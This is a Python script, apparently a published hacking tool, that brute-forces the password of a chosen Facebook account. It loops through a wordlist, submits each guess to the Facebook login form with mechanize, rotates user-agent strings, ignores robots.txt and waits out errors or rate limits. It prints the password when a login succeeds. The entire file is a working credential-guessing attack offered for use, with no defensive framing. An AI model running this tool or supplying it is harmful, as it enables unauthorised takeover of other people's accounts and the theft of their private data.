#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import sys
import random
import time

# You might need to install these: pip3 install mechanize
try:
    import mechanize
    import http.cookiejar as cookielib
except ImportError:
    print("[!] Please install mechanize: pip3 install mechanize")
    sys.exit()

# Setup headers and browser settings
useragents = [
    ('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'),
    ('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
]

login_url = 'https://www.facebook.com/login.php?login_attempt=1'

def welcome(email, passwordlist):
    wel = """
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |            #Author: Ha3MrX              | 
        |            Version 1.0 (Py3)            |
        |     https://www.youtube.com/c/HA-MRX    |
        +=========================================+
        |..........  Facebook Cracker  ...........|
        +-----------------------------------------+\n\n
    """
    try:
        with open(passwordlist, "r", encoding="utf-8", errors="ignore") as f:
            total = f.readlines()
        print(wel)
        print(f" [*] Account to crack : {email}")
        print(f" [*] Loaded : {len(total)} passwords")
        print(" [*] Cracking, please wait ...\n\n")
    except FileNotFoundError:
        print(f"[!] Error: Wordlist file '{passwordlist}' not found.")
        sys.exit()

def brute(password, br, email):
    sys.stdout.write(f"\r[*] Trying ..... {password}")
    sys.stdout.flush()
    
    br.addheaders = [random.choice(useragents)]
    try:
        br.open(login_url)
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        
        # Check if login was successful
        if log != login_url and ('login_attempt' not in log):
            print(f"\n\n[+] Password Found = {password}")
            input("Press ANY KEY to Exit....")
            sys.exit(1)
    except Exception as e:
        # Handle connection errors or rate limits
        time.sleep(2)

def search(email, passwordlist, br):
    try:
        with open(passwordlist, "r", encoding="utf-8", errors="ignore") as passwords:
            for password in passwords:
                password = password.strip()
                brute(password, br, email)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        sys.exit()

def main():
    email = input("Enter the Facebook Username/Email/Phone: ")
    passwordlist = input("Enter the wordlist name and path: ")

    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

    welcome(email, passwordlist)
    search(email, passwordlist, br)
    print("\n[!] Password does not exist in the wordlist")

if __name__ == '__main__':
    main()
